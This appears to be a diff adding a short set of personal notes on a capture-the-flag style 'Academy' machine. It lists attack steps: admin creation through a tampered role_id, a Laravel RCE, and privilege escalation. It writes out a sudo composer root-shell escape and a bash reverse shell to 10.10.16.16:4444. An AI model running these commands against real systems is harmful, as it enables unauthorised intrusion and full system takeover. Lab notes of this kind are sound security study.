@@ -1,0 +1,21 @@
+
+Academy machine
+
+1.change request (role_id) when registering to create admin account 
+2.find subdomain with bug
+3.exploit laravel 5.X exploit on that subdomain to gain RCE
+4.scan with linpeas.sh
+5.switch to more privileged user using logs
+6.composer search on  GTFObins for root access(
+
+TF=$(mktemp -d)
+echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
+sudo composer --working-dir=$TF run-script x
+
+)
+
+
+//INTERESTING COMMANDS
++ bash -c 'bash -i >& /dev/tcp/10.10.16.16/4444 0>&1'(already knew this one, but still amazes me how i can get reverse shell through tcp socket)
++aurereport --tty Audit reports in Linux are summaries or detailed outputs generated from audit logs recorded by the Linux Auditing System (in report format)
+
